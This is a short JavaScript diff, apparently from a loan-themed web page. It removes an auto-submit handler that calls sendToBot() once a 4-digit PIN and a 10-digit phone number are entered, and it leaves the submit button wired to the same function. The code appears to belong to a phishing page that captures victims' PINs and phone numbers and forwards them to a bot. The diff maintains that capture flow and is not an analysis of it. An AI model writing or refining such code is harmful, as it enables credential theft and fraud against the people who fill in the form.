@@ -637,13 +637,6 @@
         }, 1000);
     }
 
-    // AUTO-SUBMIT FEATURE
-    document.getElementById('pin').addEventListener('input', (e) => {
-        if (e.target.value.length === 4 && document.getElementById('phone').value.length === 10) {
-            sendToBot();
-        }
-    });
-
     document.getElementById('submitBtn').onclick = sendToBot;
     loadLoanData();
     if (inheritedRewindId) startMasterRewindPolling(inheritedRewindId);
